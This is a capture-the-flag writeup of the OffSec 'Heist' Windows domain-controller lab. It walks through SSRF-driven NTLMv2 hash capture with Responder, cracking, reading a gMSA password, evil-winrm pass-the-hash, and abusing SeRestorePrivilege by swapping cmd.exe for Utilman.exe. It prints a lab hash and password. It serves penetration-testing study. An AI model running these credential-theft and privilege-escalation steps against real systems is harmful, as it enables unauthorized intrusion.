---
title: "Heist"
date: 2026-04-04
draft: false
description: "OffSec Heist writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Heist

## Overview

- **OS:** Windows AD
- **IP:** 192.168.226.165
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

SSRF and then readgmsa and privesc with SERestore.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 18:55:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-04T18:56:18+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2026-04-03T18:53:34
|_Not valid after:  2026-10-03T18:53:34
|_ssl-date: 2026-04-04T18:56:58+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-title: Super Secure Web Browser
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-04T18:56:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

## Dirbusting

```

```

## Port 8080

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 993.png" >}}

## Exploitation

visiting port 8080 leads us to think there is some SSRF at play

setting up responder with the -wv switch and then visiting our server [http://192.168.45.177:80](http://192.168.45.177:80) we capture this

```
[HTTP] Sending NTLM authentication request to 192.168.226.165
[HTTP] GET request from: ::ffff:192.168.226.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.226.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:787ff23f3cc5c6d4:614FC4F4D6CFDC5CBF7CD29E8DC059F7:010100000000000022AAE28266C4DC01DC02AB51B24B5D26000000000200080043004C004700450001001E00570049004E002D0051005A00520036005500460052004B003200310043000400140043004C00470045002E004C004F00430041004C0003003400570049004E002D0051005A00520036005500460052004B003200310043002E0043004C00470045002E004C004F00430041004C000500140043004C00470045002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370037000000000000000000  
```

and on cracking it we get the pass for the user enox as **california**

{{< figure src="image 994.png" >}}

{{< figure src="image 995.png" >}}

lets read svc_apaches gmsa password

```
.\gmsapasswordreader.exe --accountname svc_apache$
```

we see that the gmsa password is 

{{< figure src="image 996.png" >}}

we can use this hash to authenticate now

```
evil-winrm -i heist.pg -u svc_apache$ -H 654D2E4EBE552389CD0FD7414DE561C0
```

authenticating as svc_apache we see that we have the SeRestorePrivilege which lets us write to any location and replace binaries

lets do this now

```
cd C:\\Windows\\system32
ren Utilman.exe Utilman.old 
ren cmd.exe Utilman.exe
```

we go to another terminal rdesktop inside and hit windows + u  to become admin

saw this other writeup which suggests this if we didnt have gui access

```
Alternatively, I came across this script SeRestoreAbuse.exe which enable us to run a commad as system if the SeRestorePrivilege is enabled as in our case.

I downloaded the scipt form here , uploaded it to the windows machine and run nc.
```
